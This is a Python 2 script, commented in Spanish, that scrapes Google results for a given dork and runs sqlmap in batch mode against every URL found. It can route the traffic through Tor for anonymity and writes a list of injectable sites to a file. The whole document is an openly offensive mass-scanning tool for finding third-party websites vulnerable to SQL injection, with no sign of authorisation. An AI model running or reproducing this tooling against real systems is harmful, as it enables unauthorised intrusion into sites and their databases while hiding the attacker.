#! usr/bin/python
# -*- coding: utf-8 -*-


import subprocess, time, os, sys,json, urllib, requests, argparse, re
from bs4 import BeautifulSoup

#Menú
parser = argparse.ArgumentParser(description='Scanner de Sqlmap + Google Dorking')
parser.add_argument("-t", "--tor", help="Utilizar anonimáto", action="store_true")
parser.add_argument("-d","--dork", help="Dork a ejecutar", required=True)
parser.add_argument("-f", "--file", help="Nombre de archivo de salida")
parser.add_argument("-u", "--useragent", help="User-agent",default="Mozilla/11.0")
args = parser.parse_args()

#Extracción de las Urls
lista_vulnerable = list()
urls = set()
urlgoogle = 'http://www.google.com/search'
payload = {'q':args.dork,'start':'0'}
user_agent = { 'User-agent' : args.useragent }
r = requests.get(urlgoogle, params = payload, headers = user_agent )
soup = BeautifulSoup( r.text, 'html.parser' )
h3tags = soup.find_all( 'h3', class_='r' )
for h3 in h3tags:
    try:
        url = re.search('url\?q=(.+?)\&sa', h3.a['href']).group(1)
	url = urllib.unquote(url).decode('utf8')
	urls.add(url)
    except:
        continue

#Comprobación SQLI
if args.tor:
    subprocess.call(['service','tor','start'])
    print "Levantamos TOR"
for url in urls:
    esVulnerable=False
    print "Analizando "+url
    if args.tor:
        p=subprocess.Popen(['sqlmap','--tor','-v','0','--random-agent','-u', url,'--batch', '--threads', '10'], stdin=subprocess.PIPE, stdout=subprocess.PIPE , stderr = subprocess.PIPE)
    else:
        p=subprocess.Popen(['sqlmap','-v','0','--random-agent','-u', url,'--batch','--threads', '10'], stdin=subprocess.PIPE, stdout=subprocess.PIPE , stderr = subprocess.PIPE)
    for line in iter(p.stdout.readline, b''):
        if re.match("back-end DBMS: ",line) is not None:
            esVulnerable= True
    if (esVulnerable):
	print "Vulnerable"
	print "---"
	lista_vulnerable.append(url)
	
    else:
	print "NO vulnerable"
	print "---"

#Escritura en el fichero
if args.file:
    f = open('fichero.txt','w')
    for vulnerable in lista_vulnerable:
        f.write(vulnerable+"\n")
    f.close()
	











